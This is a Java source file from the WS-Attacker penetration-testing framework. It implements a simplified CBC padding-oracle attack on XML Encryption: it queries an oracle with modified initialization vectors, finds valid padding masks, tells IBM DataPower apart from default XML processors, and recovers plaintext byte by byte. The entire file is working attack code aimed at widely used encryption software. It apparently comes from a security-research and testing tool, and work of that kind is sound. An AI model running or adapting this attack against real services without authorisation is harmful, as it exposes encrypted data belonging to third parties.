/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.xmlencryptionattack.attackengine.attacker.cbc;

import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.Set;
import org.apache.log4j.Logger;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.AOracle;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.request.CBCOracleRequest;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.response.OracleResponse;

/**
 * FindIVMethodSimple is the simplification of the original FindIVMethod. It
 * needs more oracle requests, but works for 16 and 8 byte long ciphers (AES and
 * DES). It works for Datapower as well as for other default XML processors.
 *
 * FindIVMethodSimple takes as input an IV and one ciphertext block. It has the
 * following responsibilities: <ul> <li> Extract all type-A characters from the
 * plaintext ('<' and '&') </li> <li> Set the last byte to 0x01 (this means that
 * only the last one byte is padded and that all the preceeding characters can
 * be accessed) </li> </ul>
 *
 * The FindIVMethodSimple is not able to process XML Strings fitting into one
 * block. Thus, if a ciphertext block would contain the following string:
 * <abc>ab</abc>, the method would most probably fail. However, this is not a
 * typical case of encrypted XML data since typical elements are much longer and
 * contain namespaces so that one element is typically split into several
 * blocks.
 *
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 */
public class FindIVMethodSimple
    extends Method
{

    Logger LOG = Logger.getLogger( FindIVMethodSimple.class );

    /**
     * block size
     */
    private final int blockSize;

    /**
     * If the last block pairs of the encrypted data are processed, the attacker has to process differently. Thus, this
     * information is hold in this boolean value
     */
    private final boolean processingLastBlock;

    /**
     * properties
     */
    private final FindIVMethodProperties properties;

    /**
     * the only (at most two) bytes that can be xored to IV and result in a valid padding byte
     */
    private final Set<Integer> paddingByteMasksFirst4Bits;

    private byte lastIvByteOriginal;

    private byte firstIvValidByte;

    private int largestPaddingByte;

    /**
     * Constructor accepting an initialization vector and a ciphertext block
     * 
     * @param oracle
     * @param iv
     * @param c1
     * @param processingLastBlock
     */
    public FindIVMethodSimple(AOracle oracle, final byte[] iv, final byte[] c1,
            boolean processingLastBlock) {
        super(oracle, iv, c1);
        this.blockSize = iv.length;
        this.processingLastBlock = processingLastBlock;
        this.properties = new FindIVMethodProperties(blockSize);
        this.paddingByteMasksFirst4Bits = new LinkedHashSet<>();
    }

    /**
     * Constructor accepting an initialization vector and a ciphertext block
     * 
     * @param oracle
     * @param iv
     * @param c1
     * @param processingLastBlock
     * @param type
     */
    public FindIVMethodSimple( AOracle oracle, final byte[] iv, final byte[] c1, boolean processingLastBlock,
                               FindIVMethodProperties.Type type )
    {
        this( oracle, iv, c1, processingLastBlock );
        this.properties.setType( type );
    }

/**
     * Executes the attack on the cipher value. First, it changes the padding
     * and the special characters ('<', '&'). Then, it executes the attack on
     * the concrete bytes in the cipher value using the FindByteMethod.
     *
     *
     *
     * @return decrypted text
     */
    @Override
    public byte[] executeAttack()
    {

        LOG.info( "FindIV simple method started" );

        // temporarily store the last IV byte
        lastIvByteOriginal = iv[blockSize - 1];

        // find padding masks
        findPaddingMasks();

        // according to the number of padding masks one can identify oracle
        identifyOracleType();

        // decrypt last byte
        decryptLastByte();

        int searchedBytes;
        if ( processingLastBlock )
        {
            searchedBytes = blockSize - properties.getByte( blockSize - 1 );
        }
        else
        {
            searchedBytes = blockSize - 1;
        }
        LOG.info( "Starting to attack specific bytes with the FindByte method" );
        byte[] tempIV = iv.clone();
        for ( int i = 0; i < searchedBytes; i++ )
        {
            int mask = this.getMaskForPadding( blockSize - i - 1 );
            tempIV[blockSize - 1] = (byte) ( lastIvByteOriginal ^ mask );
            CBCOracleRequest req = new CBCOracleRequest( tempIV, c1 );
            OracleResponse resp = m_Oracle.queryOracle( req );
            if ( resp.getResult() != OracleResponse.Result.VALID )
            {
                LOG.info( "Byte " + i + " was originally '<'." );
                tempIV[i] = (byte) ( tempIV[i] ^ 1 );
                properties.setByte( i, (byte) 0x3C );
            }
            if ( !properties.isByteDecrypted( i ) )
            {
                try
                {
                    FindByteMethod findByteMethod = new FindByteMethod( m_Oracle, tempIV, c1 );
                    LOG.info( "Attack on byte: " + i );
                    byte b = findByteMethod.executeAttack( i );
                    properties.setByte( i, b );
                    LOG.info( "Result " + (char) b + " (0x" + String.format( "%02X", b ) + ")" );
                }
                catch ( NoColumnFoundException ncfe )
                {
                    LOG.warn( "Byte " + i + " could not be decrypted. Is the file using"
                        + "a different character set or includes strange special" + " characters?" );
                    LOG.debug( "debug ", ncfe );
                }
            }

        }
        byte[] decrypted;
        if ( processingLastBlock )
        {
            decrypted = Arrays.copyOf( properties.getDecryptedBytes(), searchedBytes );
        }
        else
        {
            decrypted = Arrays.copyOf( properties.getDecryptedBytes(), blockSize );
        }
        return decrypted;
    }

    private void identifyOracleType()
    {
        if ( properties.getType() == FindIVMethodProperties.Type.UNDEFINED )
        {
            if ( paddingByteMasksFirst4Bits.size() == 1 )
            {
                // only one valid response means we are testing datapower
                LOG.info( "The server has been identified to be processing as IBM Datapower" );
                properties.setType( FindIVMethodProperties.Type.IBM_DATAPOWER );
            }
            else
            {
                // two valid responses means we are testing something else
                LOG.info( "The server has been identified to be processing as a default one" );
                properties.setType( FindIVMethodProperties.Type.DEFAULT );
            }
        }
        if ( properties.getType() == FindIVMethodProperties.Type.IBM_DATAPOWER )
        {
            largestPaddingByte = 0x0F;
        }
        else
        {
            largestPaddingByte = 0x10;
        }
    }

    /**
     * finds valid padding masks
     */
    private void findPaddingMasks()
    {
        // iterate over possible values of the first iv byte. This is necessary since some frameworks
        // do not accept null byte long strings. If a string contains < at the first position, we cannot
        // find a valid padding mask. Thus we need to change <.
        for ( int firstIVMask = 0; firstIVMask < 2; firstIVMask++ )
        {
            byte[] tempIV = iv.clone();
            tempIV[0] = (byte) ( iv[0] ^ firstIVMask );
            // iterate through all possible padding values
            for ( int b = 0; b < 256; b++ )
            {
                // set the last Block
                tempIV[blockSize - 1] = (byte) ( b ^ lastIvByteOriginal );
                CBCOracleRequest req = new CBCOracleRequest( tempIV, c1 );
                OracleResponse resp = m_Oracle.queryOracle( req );

                if ( resp.getResult() == OracleResponse.Result.VALID )
                {
                    // b was a valid mask, we have to extract first four bits
                    int pm = ( b & 0xf0 ) >> 4;
                    // add this padding mask and padding byte to the lists
                    paddingByteMasksFirst4Bits.add( pm );
                    // we remember the first valid IV byte for the next function execution
                    firstIvValidByte = tempIV[0];
                    if ( properties.getType() == FindIVMethodProperties.Type.DEFAULT )
                    {
                        // compute the second padding mask (i xor 1) and add it
                        // to the list
                        paddingByteMasksFirst4Bits.add( pm ^ 1 );
                        LOG.info( "padding bytes masks found (default oracle): "
                            + paddingByteMasksFirst4Bits.toString() );
                        return;
                    }
                    else if ( properties.getType() == FindIVMethodProperties.Type.IBM_DATAPOWER )
                    {
                        LOG.info( "padding bytes masks found (datapower oracle): "
                            + paddingByteMasksFirst4Bits.toString() );
                        return;
                    }
                }
            }
        }
    }

    /**
     * decrypt last byte to get the padding value
     * 
     * @param lastIvByte
     */
    private void decryptLastByte()
    {
        int largestPaddingMask = findMaskForLargestPadding();

        int decryptedByte = largestPaddingMask ^ largestPaddingByte;

        LOG.info( "Found the last byte in our block: 0x" + String.format( "%02X ", decryptedByte ) );

        properties.setByte( blockSize - 1, (byte) decryptedByte );
    }

    private int findMaskForLargestPadding()
    {
        byte[] tempIV = iv.clone();
        tempIV[0] = firstIvValidByte;

        final int iteratingOverIvByte;
        final int originalIteratedByte;
        if ( properties.getType() == FindIVMethodProperties.Type.IBM_DATAPOWER )
        {
            iteratingOverIvByte = 1;
            originalIteratedByte = tempIV[1];
        }
        else
        {
            iteratingOverIvByte = 0;
            originalIteratedByte = tempIV[0];
        }

        // iterate over possible first 4 bits of padding byte masks (there are one or two padding byte masks resulting
        // in 0x10 and 0x0? padding)
        for ( int pbm : paddingByteMasksFirst4Bits )
        {
            // iterate over last four bits of padding byte masks
            nextPaddingByteMask: for ( int i = 0; i < 16; i++ )
            {
                int pm = ( pbm << 4 ) + i;
                tempIV[blockSize - 1] = (byte) ( lastIvByteOriginal ^ pm );
                for ( int firstIVMask = 0; firstIVMask < 16; firstIVMask++ )
                {
                    tempIV[iteratingOverIvByte] = (byte) ( originalIteratedByte ^ ( firstIVMask << 4 ) );
                    CBCOracleRequest req = new CBCOracleRequest( tempIV, c1 );
                    OracleResponse resp = m_Oracle.queryOracle( req );
                    if ( resp.getResult() != OracleResponse.Result.VALID )
                    {
                        continue nextPaddingByteMask;
                    }
                }
                // if we get 16 valid responses, this means the padding extracted the byte we iterated over.
                // Thus we found the largest possible padding and its padding mask
                return pm;
            }
        }
        throw new NoPaddingMaskFoundException();
    }

    private int getMaskForPadding( int padding )
    {
        return padding ^ properties.getByte( blockSize - 1 );
    }

    public FindIVMethodProperties getProperties()
    {
        return properties;
    }
}
